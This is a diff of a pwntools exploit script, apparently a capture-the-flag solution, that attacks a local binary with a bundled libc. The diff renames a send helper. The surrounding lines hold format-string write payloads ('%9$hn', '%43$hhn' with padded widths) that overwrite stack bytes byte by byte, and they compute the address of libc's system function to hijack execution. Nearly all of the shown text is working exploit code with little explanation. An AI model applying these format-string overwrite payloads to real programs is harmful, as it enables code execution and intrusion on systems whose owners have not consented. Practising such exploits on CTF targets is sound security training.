@@ -8,8 +8,8 @@ context.os = "linux"
 io = process('./pwn')
 libc = ELF('./libc.so.6')
 
-def sendljust(msg: bytes):
-    io.send(msg.ljust(0x1000, b'\x00'))
+def snd(*msg):
+    io.send(flat(msg).ljust(0x1000, b'\x00'))
 
 ### leak
 
@@ -27,14 +27,14 @@ empty_stack = somestack - 0x28
 
 ### payload 1
 
-sendljust(f"%{empty_stack & 0xffff}c".encode() + b"%9$hn")
-sendljust(b"%43$hhn")
+snd(f"%{empty_stack & 0xffff}c", "%9$hn")
+snd(b"%43$hhn")
 
-sendljust(f"%{(empty_stack & 0xffff) + 1}c".encode() + b"%9$hn")
-sendljust(b"%64c%43$hhn")
+snd(f"%{(empty_stack & 0xffff) + 1}c", "%9$hn")
+snd(b"%64c%43$hhn")
 
-sendljust(f"%{(empty_stack & 0xffff) + 2}c".encode() + b"%9$hn")
-sendljust(b"%64c%43$hhn")
+snd(f"%{(empty_stack & 0xffff) + 2}c", "%9$hn")
+snd(b"%64c%43$hhn")
 
 system = base + libc.sym.system
 
@@ -42,14 +42,14 @@ system = base + libc.sym.system
 
 empty_stack += 8
 
-sendljust(f"%{empty_stack & 0xffff}c".encode() + b"%9$hn")
-sendljust(b"%c%43$hhn")
+snd(f"%{empty_stack & 0xffff}c", "%9$hn")
+snd(b"%c%43$hhn")
 
-sendljust(f"%{(empty_stack & 0xffff) + 1}c".encode() + b"%9$hn")
-sendljust(b"%64c%43$hhn")
+snd(f"%{(empty_stack & 0xffff) + 1}c", "%9$hn")
+snd(b"%64c%43$hhn")
 
-sendljust(f"%{(empty_stack & 0xffff) + 2}c".encode() + b"%9$hn")
-sendljust(b"%64c%43$hhn")
+snd(f"%{(empty_stack & 0xffff) + 2}c", "%9$hn")
+snd(b"%64c%43$hhn")
 
 ### payload 3
 
